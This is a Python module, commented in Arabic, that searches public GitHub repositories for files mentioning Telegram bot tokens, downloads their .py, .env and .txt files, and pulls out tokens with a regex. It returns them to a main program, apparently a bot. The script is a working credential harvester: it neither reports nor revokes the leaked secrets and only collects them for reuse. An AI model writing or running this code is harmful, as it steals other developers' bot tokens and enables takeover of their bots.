import re
import os
import time
from github import Github, RateLimitExceededException

# إعدادات الاتصال (يجب أن تكون GITHUB_TOKEN موجودة في البيئة)
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
g = Github(GITHUB_TOKEN)

def search_for_tokens():
    """
    هذه الدالة مطابقة تماماً لما يتوقعه main.py
    تم تعديلها لتعمل بنمط متزامن (Synchronous) لتتوافق مع threading
    """
    found_tokens = []
    
    try:
        # إصلاح الخطأ: استخدام core للتحقق من الرصيد
        rate_limit = g.get_rate_limit()
        if rate_limit.core.remaining < 5:
            return []

        # البحث في جيت هاب
        # ملاحظة: تم تعديل query ليكون أكثر دقة
        repos = g.search_repositories(query="telegram_bot_token", sort="updated")[:10]
        
        for repo in repos:
            # فلترة المستودعات المهجورة
            if repo.stargazers_count < 2:
                continue
            
            try:
                # جلب محتوى الملفات
                contents = repo.get_contents("")
                for content in contents:
                    if content.type == "file" and content.name.endswith(('.py', '.env', '.txt')):
                        text = content.decoded_content.decode('utf-8', errors='ignore')
                        # البحث عن التوكنات
                        tokens = re.findall(r'\d{8,10}:[a-zA-Z0-9_-]{35}', text)
                        found_tokens.extend(tokens)
            except:
                continue
                
    except RateLimitExceededException:
        print("[!] API Limit Exceeded, waiting...")
    except Exception as e:
        # هذا يمنع البوت من التوقف عند حدوث أي خطأ
        print(f"[!] Scanner Error: {e}")
        
    # إعادة قائمة فريدة من التوكنات لـ main.py
    return list(set(found_tokens))
